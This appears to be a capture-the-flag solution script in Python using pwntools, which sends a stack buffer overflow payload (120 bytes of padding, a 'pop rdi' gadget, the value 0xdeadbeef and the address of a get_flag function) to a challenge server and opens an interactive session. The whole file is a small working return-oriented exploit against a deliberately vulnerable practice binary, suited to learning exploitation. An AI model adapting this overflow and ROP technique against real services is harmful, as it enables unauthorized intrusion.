from pwn import *

host, port = 'binary.utctf.live', '9002'

buf = b''
buf += b'A' * 120
buf += p64(0x0000000000400693) # pop rdi
buf += p64(0xdeadbeef) # val of param1
buf += p64(0x4005ea) # address of get_flag
r = remote(host, port)
r.sendline(buf)
r.interactive()
